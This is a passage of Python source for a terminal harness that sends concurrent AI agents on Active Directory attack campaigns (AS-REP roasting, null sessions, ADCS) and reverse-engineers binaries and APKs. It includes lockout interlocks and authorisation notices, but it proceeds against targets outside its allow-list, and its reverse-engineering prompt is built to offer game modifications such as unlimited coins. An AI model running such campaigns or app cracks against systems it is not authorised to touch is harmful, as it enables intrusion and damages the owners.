                    if name == "--wave":
                        self._sys_line(
                            f"⚠ --wave takes a wave number of 1 or more, not "
                            f"{value!r}. Wave 0 is recon — it has no briefs to "
                            "run.", warn=True)
                    else:
                        self._sys_line(
                            f"⚠ --lockout takes a whole number of attempts, "
                            f"not {value!r} — the count after which the domain "
                            "locks an account.", warn=True)
                    return
                elif name == "--wave":
                    wave_number = int(value)
                else:
                    lockout = int(value)
            else:
                stripped.append(arg)
            i += 1
        rest = stripped

        if not rest:
            self._ad_usage()
            return

        # The domain is one token, not a sentence: `validate_target` is what
        # says so, and it is also what normalises the case and the trailing dot
        # the ack is compared against.
        try:
            domain = ad_mod.validate_target(" ".join(rest))
        except ValueError as e:
            self._sys_line(f"⚠ {e}", warn=True)
            return

        # The gate. A missing ack and a wrong ack are refused identically — the
        # message is the line to run, either way, and saying which half was
        # wrong would only help someone guessing.
        if ack is None or ack.strip().lower().rstrip(".") != domain:
            self._sys_line(
                f"⚠ /ad is gated. Confirm the domain by typing it back:", warn=True)
            self._sys_line(f"  {ad_mod.refusal(domain)}", warn=True)
            return

        if self.busy:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        # The probe runs here, once, and its result goes three places: this
        # banner, the recon prompt the agents are given, and the list of
        # vectors that are out of scope for the run. That is the "detect and
        # degrade" decision — a vector whose tooling is absent is skipped and
        # *named as skipped*, rather than sending an agent after a binary that
        # is not on the box.
        probes = ad_mod.probe_tools()

        # Warn but proceed, exactly as `/bug-hunt` does: AGENTS.md treats any
        # target the operator declares as authorised, and the deny-list still
        # hard-blocks mid-campaign.
        allowed, reason = self.agent.scope.allows(domain)
        if not allowed:
            self._sys_line(f"⚠ not in allow.yaml — {reason}", warn=True)
            self._sys_line("running anyway; out-of-scope hosts stay hard-blocked")

        try:
            directory = hunt_mod.case_dir(self.cfg, domain, ad_mod.AD_KIND)
        except ValueError as e:
            self._sys_line(f"⚠ {e}", warn=True)
            return

        reused = None if fresh else hunt_mod.find_recon(directory)

        present = [q for q in probes if q.present]
        missing = [q for q in probes if not q.present]
        skipped = ad_mod.unavailable_vectors(probes)

        t = Text()
        t.append("  ◈ DOMAIN    ", style=f"bold {p.accent}")
        t.append(f"{domain}\n", style=f"bold {p.primary}")
        t.append("  ◈ RECON     ", style=f"bold {p.accent}")
        if fresh:
            t.append("--fresh — remapping the domain\n", style=p.primary)
        elif reused is not None:
            t.append(
                f"reusing notes from {reused.path.name} "
                f"({reused.age_days}d old) — no remap\n",
                style=p.primary,
            )
        else:
            t.append("mapping the domain — DCs, functional level, surface\n",
                     style=p.primary)
        t.append("  ◈ TOOLS     ", style=f"bold {p.accent}")
        t.append(f"{len(present)}/{len(probes)} present", style=p.primary)
        if missing:
            t.append(f"  ·  absent: {', '.join(q.name for q in missing)}",
                     style=p.dim)
        t.append("\n", style=p.dim)
        if skipped:
            t.append("  ◈ DEGRADED  ", style=f"bold {p.amber}")
            t.append(
                f"{', '.join(skipped)} — no tooling on this host; those vectors "
                "are skipped and will be reported as skipped\n", style=p.dim)
        # The interlock's settings, stated before the run rather than discovered
        # by hitting them. `limit` is the number the operator can actually
        # spend, which is lockout - 1 — the distinction between "the domain
        # locks at five" and "you get four" is the whole point of the class.
        t.append("  ◈ INTERLOCK ", style=f"bold {p.accent}")
        t.append(
            f"locks at {lockout}  ·  {max(1, lockout - 1)} credential "
            f"attempt(s) permitted  ·  {ad_mod.DEFAULT_RATE:g}/s, "
            f"burst {ad_mod.DEFAULT_BURST}\n", style=p.primary)
        t.append("  ◈ WRITES    ", style=f"bold {p.accent}")
        if armed:
            t.append("ARMED — destructive commands are permitted this run\n",
                     style=f"bold {p.amber}")
        else:
            t.append(
                "read-only — ACL changes, password resets and relay writes are "
                "refused (--arm to permit)\n", style=p.primary)
        running = wave_number or hunt_mod.next_wave_number(directory)
        t.append("  ◈ WAVE      ", style=f"bold {p.accent}")
        t.append(f"wave {running} — ", style=f"bold {p.primary}")
        t.append(
            f"{hunt_mod.HUNT_WAVE_SIZE} agents, all concurrent, then it stops\n"
            if wave_number is None else
            f"{hunt_mod.HUNT_WAVE_SIZE} agents, all concurrent\n",
            style=p.primary,
        )
        t.append("  ◈ EVIDENCE  ", style=f"bold {p.accent}")
        t.append(str(directory) + "\n", style=p.dim)
        t.append("  ◈ NOTICE    ", style=f"bold {p.amber}")
        t.append(
            "authorised use only — a domain you own, a consented audit, or a "
            "declared engagement with a known lockout policy\n",
            style=p.dim,
        )
        t.append("  · ", style=p.dim)
        t.append("/stop-hunt", style=p.primary)
        t.append(" ends the wave   ·   ", style=p.dim)
        t.append("/summary-hunt", style=p.primary)
        t.append(" writes the report   ·   ", style=p.dim)
        t.append("/findings", style=p.primary)
        t.append(" shows the tracker   ·   ", style=p.dim)
        t.append("/ad tools", style=p.primary)
        t.append(" re-probes the tooling\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

        pane = self._zim_pane()
        if pane is not None:
            pane.show_hunt(domain, hunt_mod.HUNT_WAVE_SIZE)

        self._run_ad(domain, probes=probes, fresh=fresh,
                     wave_number=wave_number, lockout=lockout, armed=armed)

    # ---- /reverse-engineer -------------------------------------------------

    def _cmd_reverse_engineer(self, args) -> None:
        """`/reverse-engineer <path>` — map an artifact, then ask what to change.

        Read-only up to the last step. The map is built here, on this machine,
        from the file's own bytes: no model, no network, and the artifact is
        neither executed nor modified. What the agent receives is that map — so
        the turn that follows starts from evidence rather than from a guess
        about what the file probably is.

        The turn's job is to work out what the artifact *is* and then ask the
        operator what they want from it. It is deliberately not asked to make
        the change: the preference is the point, and an agent that patches a
        binary before asking has produced exactly what was not wanted. The
        option menu is product-specific on purpose — a Flappy Bird clone is
        offered unlimited coins and no ad breaks, and nothing in this file
        knows what Flappy Bird is.

        `--map` stops before the turn entirely. The map alone is often the
        whole answer, and it is the version that is safe to run against a file
        whose provenance you are unsure of — nothing leaves the process.
        """
        p = self.palette
        map_only = any(a in ("--map", "-m") for a in args)
        rest = [a for a in args if a not in ("--map", "-m")]

        if not rest:
            self._reverse_usage()
            return

        # Quoted paths are stripped so `/reverse-engineer "My App.apk"` means
        # what it reads as; a path with spaces has to be quoted to survive the
        # command splitter, and leaving the quotes on would look for a file
        # whose name starts with a quote mark.
        raw = " ".join(rest)
        if len(raw) >= 2 and raw[0] == raw[-1] and raw[0] in "\"'":
            raw = raw[1:-1]

        # Resolved against the session workdir, through the jail, like every
        # other path this harness is handed. A bare `app.apk` has to mean
        # `<workdir>/app.apk` — resolving it against the process cwd would make
        # the same command mean a different file depending on where `zimzilla`
        # happened to be launched from, which is the bug the jail exists for.
        from ..sandbox import SandboxError, resolve_in_jail
        try:
            path = resolve_in_jail(self.cfg.workdir, raw, self.cfg.unsafe,
                                   must_exist=True)
        except SandboxError as exc:
            self._sys_line(f"refused: {exc}", warn=True)
            return

        # `/reverse-engineer` is in BUSY_OK so `--map` stays typeable mid-turn;
        # the full run would interleave a second turn into the live one.
        if self.busy and not map_only:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return

        # `identify` and `inventory` are documented never to raise: an
        # unreadable artifact is described, not thrown. No handler here,
        # because one would only hide the day that stops being true.
        artifact = reverse_mod.identify(path)

        inv = reverse_mod.inventory(artifact)
        probes = reverse_mod.probe_tools()
        self.query_one(ChatPane).write_block(
            self._render_artifact_map(artifact, inv, probes))

        if map_only:
            self._sys_line(
                "--map — nothing was sent to the model, nothing was written",
                ok=True)
            return

        self._run_turn(
            reverse_mod.build_prompt(artifact, inv, probes),
            display=f"⌬ /reverse-engineer {path.name}",
        )

    def _render_artifact_map(self, art, inv, probes) -> Text:
        """The map, for the transcript. Rendering only — no probing here."""
        p = self.palette
        t = Text()
        t.append("  ARTIFACT   ", style=f"bold {p.accent}")
        t.append(f"{art.path.name}\n", style=f"bold {p.primary}")
        t.append("  KIND       ", style=f"bold {p.accent}")
        t.append(f"{art.label}", style=p.primary)
        t.append(f"  ({art.kind})\n", style=p.dim)
        t.append("  SIZE       ", style=f"bold {p.accent}")
        t.append(reverse_mod.human_size(art.size) + "\n", style=p.dim)
        if art.sha256:
            t.append("  SHA256     ", style=f"bold {p.accent}")
            t.append(art.sha256[:32] + "…\n", style=p.dim)
        if art.magic:
            t.append("  HEADER     ", style=f"bold {p.accent}")
            t.append(art.magic + "\n", style=p.dim)

        if inv.facts:
            t.append("\n  FACTS\n", style=f"bold {p.accent}")
            for k, v in inv.facts:
                t.append(f"  {k:<16}", style=p.primary)
                t.append(f"{v}\n", style=p.dim)

        if inv.members:
            t.append(f"\n  {reverse_mod.member_heading(art.kind)}\n",
                     style=f"bold {p.accent}")
            for name, size in inv.members:
                t.append(f"  {reverse_mod.human_size(size):>10}  ",
                         style=p.dim)
                t.append(f"{name}\n", style=p.primary)

        if inv.signals:
            t.append("\n  STRINGS WORTH NOTING\n", style=f"bold {p.accent}")
            for category, value in inv.signals:
                t.append(f"  {category:<10}", style=p.amber)
                t.append(f"{value}\n", style=p.dim)

        if inv.notes:
            t.append("\n  NOTES\n", style=f"bold {p.accent}")
            for note in inv.notes:
                t.append("  · ", style=p.accent)
                t.append(f"{note}\n", style=p.dim)

        covered, total, missing = self._reverse_coverage(art.kind, probes)
        t.append("\n  TOOLING    ", style=f"bold {p.accent}")
        t.append(f"{covered}/{total} capabilities covered by this host\n",
                 style=p.primary)
        if missing:
            t.append("  MISSING    ", style=f"bold {p.amber}")
            t.append(", ".join(reverse_mod.CAPABILITY_LABELS.get(c, c)
                               for c in missing) + "\n", style=p.dim)
            t.append("  ", style=p.dim)
            t.append(f"/reverse-engineer-tools {art.kind}",
                     style=f"bold {p.primary}")
            t.append("  for what to install\n", style=p.dim)
        return t

    def _reverse_coverage(self, kind, probes):
        """(covered, total, missing capabilities) for one artifact kind."""
        status = reverse_mod.capability_status(kind, probes)
        have = [c for c, h, _ in status if h]
        miss = [c for c, h, _ in status if not h]
        return len(have), len(status), miss

    def _reverse_usage(self) -> None:
        p = self.palette
        t = Text()
        t.append("  REVERSE ENGINEER\n\n", style=f"bold {p.accent}")
        for command, blurb in reverse_mod.USAGE_LINES:
            t.append(f"  {command:<34}", style=f"bold {p.primary}")
            t.append(blurb + "\n", style=p.dim)
        t.append("\n  Works on ", style=p.dim)
        t.append(".apk · .jar · .zip · .exe · .dll · .so · ELF · Mach-O · "
                 ".dex · .sh and other scripts", style=p.primary)
        t.append("\n  — and on a directory, which it triages first.\n", style=p.dim)
        # Say this here rather than only in the refusal: a path outside the
        # session directory is the single most likely way this command gets
        # used wrongly, and the message it gets back should not be the first
        # time the operator learns there is a boundary.
        t.append(f"\n  Paths resolve against the session directory "
                 f"({self.cfg.workdir}).\n", style=p.dim)
        t.append("\n  The map is built locally from the file's own bytes. "
                 "Nothing is\n  executed, nothing is modified, and with "
                 "--map nothing is sent anywhere.\n", style=p.dim)
        t.append("\n  Point it at artifacts you own or are authorised to take "
                 "apart.\n", style=p.amber)
        self.query_one(ChatPane).write_block(t)

    def _cmd_reverse_engineer_tools(self, args) -> None:
        """`/reverse-engineer-tools [kind]` — what this host has, and what it lacks.

        The whole catalogue, or one artifact type's slice of it. Grouped by
        capability rather than by program because the question is "can I do
        this work here", and three decompilers with none of them installed is
        a gap while one working disassembler out of four is not.

        Answers while the harness is busy: it is a `shutil.which` sweep that
        starts no turn, and "what does this box have" is worth asking mid-run.
        """
        p = self.palette
        probes = reverse_mod.probe_tools()
        present = [q for q in probes if q.present]
        absent = [q for q in probes if not q.present]

        kind = ""
        if args:
            kind = args[0].lower()
            if kind not in reverse_mod.KIND_ORDER:
                self._sys_line(
                    f"unknown artifact kind: {kind} — try "
                    + " | ".join(reverse_mod.KIND_ORDER), warn=True)
                return

        t = Text()
        t.append("  REVERSE ENGINEERING TOOLING", style=f"bold {p.accent}")
        if kind:
            t.append(f"  · {reverse_mod.KIND_LABELS[kind]}",
                     style=f"bold {p.primary}")
        t.append("\n\n")
        t.append(f"  {len(present)}/{len(probes)} present\n", style=p.primary)

        # The slice for this artifact type, if one was named. `rel` is the set
        # of names it covers, so ABSENT can be filtered by the same slice
        # rather than re-running `tools_for`.
        relevant = reverse_mod.tools_for(kind, probes) if kind else None
        shown_present = [q for q in (relevant if relevant is not None else present)
                         if q.present]
        rel = {q.name for q in relevant} if relevant is not None else None

        t.append("\n  PRESENT\n", style=f"bold {p.accent}")
        if shown_present:
            for q in shown_present:
                t.append(f"  ✔ {q.name:<22}", style=p.primary)
                t.append(f"{reverse_mod.CAPABILITY_LABELS.get(q.capability, q.capability)}\n",
                         style=p.dim)
        else:
            t.append("  (none relevant to this artifact type)\n", style=p.dim)

        shown_absent = [q for q in absent if rel is None or q.name in rel]
        if shown_absent:
            t.append("\n  ABSENT\n", style=f"bold {p.accent}")
            for q in shown_absent:
                t.append(f"  ✘ {q.name:<22}", style=p.amber)
                t.append(f"{q.hint}\n", style=p.dim)

        # Coverage per artifact type: the one number that says whether an
        # artifact can actually be worked on here, rather than whether one
        # particular program happens to be installed.
        kinds = [kind] if kind else [k for k in reverse_mod.KIND_ORDER
                                     if k != "dir"]
        t.append("\n  COVERAGE BY TYPE\n", style=f"bold {p.accent}")
        for k in kinds:
            covered, total, missing = self._reverse_coverage(k, probes)
            label = reverse_mod.KIND_LABELS.get(k, k)
            style = p.primary if missing else p.dim
            t.append(f"  {label:<20}", style=style)
            t.append(f"{covered}/{total}  ", style=p.dim)
            t.append(("missing: " + ", ".join(
                reverse_mod.CAPABILITY_LABELS.get(c, c) for c in missing)
                + "\n") if missing else "complete\n", style=p.dim)

        gaps = reverse_mod.missing_tools(probes)
        t.append("\n  TO INSTALL\n", style=f"bold {p.accent}")
        t.append("  Package names where a distro package exists, upstream "
                 "project names\n  where the tool only ships as a release "
                 "(jadx, Ghidra, apktool):\n", style=p.dim)
        line = "  "
        for hint, _name in gaps:
            if len(line) + len(hint) > 74:
                t.append(line.rstrip() + "\n", style=p.primary)
                line = "  "
            line += hint + "  "
        if line.strip():
            t.append(line.rstrip() + "\n", style=p.primary)
        self.query_one(ChatPane).write_block(t)

    def _cmd_ad_tools(self) -> None:
        """`/ad tools` — what the AD toolchain looks like on this host.

        The same probe the campaign runs, on demand: an operator about to plan
        around certipy wants to know whether certipy is here *before* the run,
        and one who has just installed it wants to confirm the campaign will
        now see it.
        """
        p = self.palette
        probes = ad_mod.probe_tools()
        present = [q for q in probes if q.present]
        missing = [q for q in probes if not q.present]
        skipped = ad_mod.unavailable_vectors(probes)

        t = Text()
        t.append("  AD TOOLING\n\n", style=f"bold {p.accent}")
        t.append(f"  {len(present)}/{len(probes)} present\n\n", style=p.primary)
        t.append("  PRESENT\n", style=f"bold {p.accent}")
        for q in present:
            t.append(f"  ✔ {q.name:<22}", style=p.primary)
            t.append(f"{q.vector}\n", style=p.dim)
        if not present:
            t.append("  (none)\n", style=p.dim)
        if missing:
            t.append("\n  ABSENT\n", style=f"bold {p.accent}")
            for q in missing:
                t.append(f"  ✘ {q.name:<22}", style=p.amber)
                t.append(f"{q.hint}\n", style=p.dim)
        t.append("\n  ", style=p.dim)
        if skipped:
            t.append("SKIPPED VECTORS  ", style=f"bold {p.amber}")
            t.append(
                f"{', '.join(skipped)} — every tool for these is absent, so a "
                "campaign would report them as skipped rather than run them\n",
                style=p.dim)
        else:
            t.append("SKIPPED VECTORS  ", style=f"bold {p.accent}")
            t.append("none — every vector has at least one tool\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    def _ad_usage(self) -> None:
        p = self.palette
        t = Text()
        t.append("  ACTIVE DIRECTORY\n\n", style=f"bold {p.accent}")
        t.append("  /ad <domain> --ack <domain>  ", style=f"bold {p.primary}")
        t.append("recon, then one wave of AD vectors, then stop\n", style=p.dim)
        t.append("  /ad <domain> --ack <domain> --wave N  ", style=f"bold {p.primary}")
        t.append("run wave N specifically\n", style=p.dim)
        t.append("  /ad <domain> --ack <domain> --lockout N  ",
                 style=f"bold {p.primary}")
        t.append("how many bad passwords lock an account (default 5)\n", style=p.dim)
        t.append("  /ad <domain> --ack <domain> --fresh  ", style=f"bold {p.primary}")
        t.append("remap even if recon is already on disk\n", style=p.dim)
        t.append("  /ad <domain> --ack <domain> --arm  ", style=f"bold {p.primary}")
        t.append("permit destructive commands (off by default)\n", style=p.dim)
        t.append("  /ad tools            ", style=f"bold {p.primary}")
        t.append("what AD tooling this host actually has\n", style=p.dim)
        t.append("\n  The gate is the domain typed back. It is not a security\n",
                 style=p.dim)
        t.append("  control — it makes the target something you had to say.\n\n",
                 style=p.dim)
        t.append("  The interlock is arithmetic, not a promise: one shared\n",
                 style=p.dim)
        t.append("  throttle, a hard attempt counter, and a breaker that trips\n",
                 style=p.dim)
        t.append("  at ", style=p.dim)
        t.append("lockout - 1", style=p.primary)
        t.append(" and refuses every credential-bearing\n", style=p.dim)
        t.append("  command after it. Writes to the directory are refused\n",
                 style=p.dim)
        t.append("  outright unless you pass ", style=p.dim)
        t.append("--arm", style=p.primary)
        t.append(".\n\n", style=p.dim)
        t.append("  Wave 1 is the unauthenticated surface — null sessions,\n",
                 style=p.dim)
        t.append("  AS-REP roasting, anonymous LDAP, SMB signing, ADCS\n",
                 style=p.dim)
        t.append("  reachability. Later waves are planned against what it got.\n",
                 style=p.dim)
        t.append("  Evidence lands in ", style=p.dim)
        t.append(f"{Path(self.cfg.state_dir) / 'hunts'}/ad-<domain>/\n",
                 style=p.primary)
        t.append("  Run it under ", style=p.dim)
        t.append("/mode zim", style=p.primary)
        t.append(" so the agents follow your AGENTS.md doctrine.\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    def on_wave_overlay_stop_requested(
            self, event: WaveOverlay.StopRequested) -> None:
        """``ctrl+x`` in the wave view — the same thing ``/stop-hunt`` does.

        Routed through ``_cmd_stop_hunt`` rather than setting the flag here, so
        the two ways to stop a campaign cannot drift apart. The view has already
        confirmed the keypress in its own footer, which matters because the line
        ``_cmd_stop_hunt`` writes goes to the transcript behind the overlay.
        """
        self._cmd_stop_hunt(None)

    def _cmd_stop_hunt(self, args) -> None:
        """/stop-hunt — end the campaign. Works while the harness is busy."""
        run = self._hunt_run
        if run is None:
            self._sys_line("no hunt is running", warn=True)
            return
        self._hunt_stop.set()
        self._sys_line("stop requested — cancelling the wave…", warn=True)

    def _cmd_summary_hunt(self, args) -> None:
        """/summary-hunt — the closing report.

        Mid-hunt this only *queues* the summary: it runs at the next wave
        boundary, because a second turn streaming into the same transcript
        would corrupt the one already running. With no hunt live, it writes the
        report straight from the archived findings of the most recent campaign.
        """
        if self._hunt_run is not None:
            self._hunt_summary_queued = True
            self._sys_line(
                f"summary queued — it runs at the end of wave "
                f"{self._hunt_run.wave}", ok=True,
            )
            return

        latest = self._latest_hunt_dir()
        if latest is None:
            self._sys_line("no hunt has run in this session yet", warn=True)
            return
        run = hunt_mod.load_run(latest)
        if run is None:
            self._sys_line(f"no findings archived in {latest}", warn=True)
            return
        self._run_summary(run)

    def _cmd_findings(self, args) -> None:
        """/findings — the tracker, as its own window.

        Mid-hunt it opens the live campaign's findings; with no hunt running it
        reads the most recent campaign off disk, the same way `/summary-hunt`
        does, so the tracker is still answerable after the campaign has ended.
        Opening it again closes it, so the command toggles.
        """
        panel = self._findings_panel
        if panel is not None:
            self._close_findings()
            return

        if self._hunt_run is not None:
            run = self._hunt_run
            target, live = run.target, True
        else:
            latest = self._latest_hunt_dir()
            run = hunt_mod.load_run(latest) if latest is not None else None
            if run is None:
                self._sys_line(
                    "no findings yet — run /bug-hunt, or /findings after one "
                    "has finished", warn=True)
                return
            target, live = run.target, False

        # The panel reads finding *dicts*, the same shape the hunt events carry,
        # so one renderer serves both the panel and the transcript line.
        findings = [hunt_mod._finding_dict(f) for f in run.ranked()]
        screen = FindingsPanel(self.palette, target=target, live=live)
        screen.set_findings(findings)
        self._findings_panel = screen
        try:
            self.push_screen(screen, self._findings_closed)
        except Exception:
            self._findings_panel = None

    def _findings_closed(self, _result=None) -> None:
        self._findings_panel = None

    def _cmd_report_bug_hunt(self, args) -> None:
        """/report-bug-hunt — the evidence-only report, every wave.

        No model call: the report is assembled from what was recorded, so
        nothing in it is a paraphrase of evidence. That is the difference from
        `/summary-hunt`, which is a written narrative with remediation and is
        the right document for a different reader.

        Refused while the harness is busy, because the live run's findings are
        still arriving and a report built from half a wave is a report that
        under-counts. The archived campaign is read instead — the same path
        `/summary-hunt` uses with no hunt live.
        """
        if self.busy:
            self._sys_line(
                "harness is busy — /stop-hunt the wave first, then write the "
                "report", warn=True)
            return

        latest = self._latest_hunt_dir()
        if latest is None:
            self._sys_line("no hunt has run in this session yet", warn=True)
            return
        run = hunt_mod.load_run(latest)
        if run is None or not run.findings:
            self._sys_line(f"no findings archived in {latest}", warn=True)
            return

        try:
            path = hunt_mod.write_evidence_report(self.cfg, run)
        except OSError as e:
            self._sys_line(f"⚠ could not write the report — {e}", warn=True)
            return
        if path is None:
            self._sys_line("nothing to report", warn=True)
            return

        p = self.palette
        t = Text()
        t.append("  ◈ REPORT    ", style=f"bold {p.accent}")
        t.append(f"{len(run.findings)} finding(s), "
                 f"{len(run.wave_records) or run.wave} wave(s)\n",
                 style=f"bold {p.primary}")
        t.append("  ◈ EVIDENCE  ", style=f"bold {p.accent}")
        t.append(str(path) + "\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)
        self._sys_line("evidence only — no remediation, no narrative; "
                       "/summary-hunt writes the other report", ok=True)

    def _refresh_findings(self) -> None:
        """Repaint the open tracker from the live run, if there is one.

        Reads the run rather than the event so the panel and the transcript
        cannot disagree about what was found, and a duplicate the tracker
        dropped stays dropped.
        """
        panel = self._findings_panel
        run = self._hunt_run
        if panel is None or run is None:
            return
        try:
            panel.set_findings([hunt_mod._finding_dict(f) for f in run.ranked()])
        except Exception:
            pass

    def _close_findings(self) -> None:
        panel = self._findings_panel
        self._findings_panel = None
        if panel is not None:
            try:
                panel.dismiss(None)
            except Exception:
                pass

    def _latest_hunt_dir(self) -> Path | None:
        """The campaign `/summary-hunt` and `/findings` should read.

        This session's own campaign wins, and that is the fix for a real
        misfire: the operator runs a wave, asks for the report one line later,
        and the report is written about a *different* target. The heuristic
        below is a guess, and on a machine holding more than one campaign the
        guess is wrong often enough to matter — most sharply for the campaign
        left by the old unbounded loop, whose files boot re-filing rewrites with
        a fresh mtime. Nothing about that campaign is recent; only its metadata
        is. So the run this session started, which is not a guess at all, is
        preferred whenever there is one.
        """
        if self._hunt_dir is not None and self._hunt_dir.is_dir():
            return self._hunt_dir

        # Otherwise the most recently written campaign. `_campaign_dirs` orders
        # by the newest *artefact* rather than the directory's own mtime, for
        # the reason documented there: writing a file into a directory does not
        # touch the directory, but `migrate_hunts` moving files into one bumps
        # it to now — so the directory's mtime can rank a campaign that ran last
        # week above one that finished an hour ago. It is the same trap in both
        # places, and it already has a correct answer in `tools.py`.
        try:
            dirs = tools_mod._campaign_dirs(self.cfg.state_dir)
        except Exception:  # noqa: BLE001
            return None
        return dirs[0] if dirs else None

    @work(exclusive=True)
    async def _run_summary(self, run) -> None:
        """Write a closing report for a finished campaign, off the UI thread.

        The body is the model's prose, but the report is *always* written: a
        turn that returns nothing still gets the deterministic evidence report
        as its body, and the operator is told which of the two they are looking
        at. This used to archive a frontmatter-only file under a cheerful
        "report archived" — 80 bytes, no findings, and no way to tell a model
        that produced nothing from a campaign that found nothing.
        """
        p = self.palette
        chat = self.query_one(ChatPane)
        bar = self.query_one(StatusBar)
        self.busy = True
        bar.set_activity("writing the hunt report", busy=True)
        chat.write_block(R.turn_marker(self.agent.turn_count + 1, p))
        chat.write_block(R.user_prompt_block("⚑ /summary-hunt", p))
        try:
            text = ""
            async for ev in self.agent.run_turn(hunt_mod.summary_prompt(run)):
                if ev.get("type") == "text_delta":
                    text += ev.get("text", "")
                await self._handle_event(ev)
            # No prose means the narrative half failed — an upstream that
            # answered with a tool call, a turn that hit an error, a model that
            # returned nothing. The findings are already on disk, so the report
            # falls back to what was recorded rather than to an empty file, and
            # says so, so nobody reads a machine-written report as the model's
            # assessment.
            narrated = bool(text.strip())
            if not narrated:
                text = hunt_mod.build_evidence_report(run)
            path = hunt_mod.write_summary(self.cfg, run, text)
            if narrated:
                self._sys_line(f"report archived: {path}", ok=True)
            else:
                self._sys_line(
                    f"the model returned no report — archived the recorded "
                    f"evidence instead: {path}", warn=True)
        except Exception as e:  # noqa: BLE001
            chat.write_block(R.error_block(
                f"summary failed: {type(e).__name__}: {e}", p))
        finally:
            self.busy = False
            bar.set_activity("idle", busy=False)
            bar.render_bar()
            self._sync_rails()
            self.query_one("#input", Input).focus()

    @work(exclusive=True)
    async def _run_hunt(self, target: str, *, fresh: bool = False,
                        wave_number: int | None = None,
                        kind: "hunt_mod.CampaignKind | None" = None,
                        on_finish=None) -> None:
        """The campaign worker: recon, then one wave.

        Shaped like _run_team — busy flag, an on_event sink, a spinner, and a
        finally that restores idle state — but the loop inside lives in
        zimzilla/hunt.py so it can be tested without a terminal.

        ``fresh`` is forwarded to ``run_hunt``: it forces the mapping phase even
        when the scope already has recon on disk. ``wave_number`` names the wave
        to run; None means the next one the scope has not run yet. See
        ``_cmd_bug_hunt``.

        ``kind`` selects the doctrine; None is ``HUNT_KIND``, `/bug-hunt`
        exactly as it shipped. ``/ad`` is a *call* into this same worker rather
        than a copy of it, because the recon overlay, the wave web, the tracker
        rail, the stop flag and the closing report are the engine's and none of
        them are doctrine-specific. What it adds is one sink of its own, over
        the same event stream — see ``_run_ad``.

        ``on_finish`` is called once the campaign is over, from inside this
        worker's own ``finally``. It is how `/ad` reports what the interlock
        did: this method is ``@work``-decorated, so it returns a Worker and
        *not* a coroutine, and a caller who wrapped the call in their own
        ``try/finally`` would fire it the instant the worker was scheduled —
        long before a single agent ran.
        """
        p = self.palette
        chat = self.query_one(ChatPane)
        bar = self.query_one(StatusBar)
        pane = self._zim_pane()

        self.busy = True
        self._cancelled = False
        self._set_rain(False)
        self._hunt_stop = asyncio.Event()
        self._hunt_summary_queued = False
        self._hunt_tokens = (0, 0, 0.0)
        # Publish the run *before* the loop starts, not after it returns. This
        # is what `/stop-hunt` and `/summary-hunt` read, and the loop does not
        # return until the campaign is over — so publishing it at the end, as
        # this once did, left both commands looking at None for the entire hunt
        # and quietly refusing to do anything. The run object is handed to
        # run_hunt rather than built there so there is exactly one of it.
        # `kind` is resolved here rather than at the call site so the directory
        # the run is published with is the same one `run_hunt` will use. With
        # it, an AD campaign's directory carries the `ad-` prefix from the
        # moment `/stop-hunt` can first see it.
        self._hunt_run = hunt_mod.HuntRun(
            target=target,
            directory=hunt_mod.case_dir(self.cfg, target, kind))
        # Kept for the campaign's notice to the main agent, which is built from
        # the event at the end — by which point the run object is being cleared.
        self._hunt_target = target
        # And kept for `/summary-hunt` and `/findings` after the run is cleared.
        # This is the campaign the operator just ran; the newest-directory
        # heuristic is only a fallback for a session that has not run one.
        self._hunt_dir = self._hunt_run.directory

        counter = {"running": 0, "total": 0, "wave": 0, "done": 0}
        #: name -> colour, so a tool line, its prose and its result panel all
        #: agree on which agent they belong to. Ten interleaved agents are
        #: unreadable without that. Keyed by name because the result event
        #: carries the name and not the index.
        colors: dict[str, str] = {}

        # Light the loop rail's HACK node for the whole campaign. A hunt is not
        # a turn, so nothing else sets a stage for it — without this the rail
        # sat on IDLE from recon to the closing report, which reads as an idle
        # harness while ten agents are attacking the target.
        loop = self._loop_rail()
        if loop is not None:
            loop.set_hunt(wave=0)
            loop.set_stage("hacking")
        #: The live recon window, while recon is running. Held here so the
        #: worker can pop exactly the screen it pushed, and so a stop mid-recon
        #: can take it down from the `finally`.
        overlay: dict = {"screen": None}
        #: The live wave web, while a wave is running. Same lifecycle as the
        #: recon window — pushed at the wave boundary, popped at the next one —
        #: but a separate slot, because the two are never up at the same time and
        #: one being replaced must not take the other's identity with it.
        web: dict = {"screen": None}
        #: Findings carried in from an earlier campaign, held from the skip
        #: event until the first wave's web is up. There is no tracker rail
        #: before a wave starts, so seeding the pane is the only way the
        #: operator sees them — and a tracker that opened empty over a scope
        #: with twelve known bugs would read as though nothing had ever been
        #: found. Consumed once, by the first wave.
        seed: dict = {"findings": []}

        async def on_event(ev: dict) -> None:
            if self._cancelled:
                return
            etype = ev.get("type")

            if pane is not None:
                pane.note_hunt(ev)

            # The wave view sees every event that describes a wave, whether or
            # not the transcript also renders it below. Fed before the transcript
            # branches so a finding reaches the tracker in the same tick the
            # transcript prints it, rather than after the whole chain of elifs.
            #
            # ``hunt_agent_result`` and ``hunt_agent_text`` are in this list
            # because they are the half of an agent's work the panes exist to
            # show: the result is the command's actual output, and without it
            # every pane drew a command over an empty box. They were being
            # emitted, routed to the transcript, and dropped here.
            if web["screen"] is not None and etype in (
                "hunt_plan", "hunt_agent_start", "hunt_agent_tool",
                "hunt_agent_result", "hunt_agent_text", "hunt_agent_done",
                "hunt_finding", "hunt_wave_end",
            ):
                try:
                    web["screen"].note(ev)
                except Exception:
                    pass

            # Recon narrates into its own window. Every recon event is consumed
            # here and returns — nothing recon does belongs in the transcript,
            # which is where the waves go.
            if etype in ("hunt_recon_tool", "hunt_recon_text"):
                screen = overlay["screen"]
                if screen is not None:
                    try:
                        screen.note(ev)
                    except Exception:
                        pass
                return

            # The planner narrates into the wave view, which is already up and
            # has no roster to draw yet. Consumed here rather than falling
            # through: this is the wave's own thinking, not campaign output, and
            # the transcript is where the agents' work goes.
            if etype in ("hunt_plan_tool", "hunt_plan_text"):
                screen = web["screen"]
                if screen is not None:
                    try:
                        screen.note(ev)
                    except Exception:
                        pass
                return

            if etype == "hunt_recon_skipped":
                # The scope was already mapped by an earlier campaign, so no
                # recon runs and no recon window goes up. The carried findings
                # are held for the first wave's web, which is where the tracker
                # can actually show them — there is no rail up yet.
